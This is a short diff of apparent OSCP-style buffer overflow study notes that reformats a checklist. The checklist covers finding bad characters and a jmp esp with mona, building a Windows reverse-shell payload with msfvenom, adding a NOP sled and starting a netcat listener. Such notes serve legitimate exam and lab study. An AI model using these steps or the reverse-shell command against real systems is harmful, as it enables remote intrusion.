@@ -56,7 +56,8 @@ notice the output starts at \x03 skipping over the bad chars
 - check bad chars in mona with esp address 
   - !mona compare -f C:\mona\oscp\bytearray.bin -a (ESP Address)
 - find jmp esp - !mona jmp -r esp -cpb "(found bad chars)"
-- generate shell code with msfvenom msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
+- generate shell code with msfvenom 
+  - msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
 - Add NOP sled to prepend in myexp.py 
   - prepend = "\x90" * 16 in myexp.py
 - Start Netcat Listener for port usesd in msfvenom
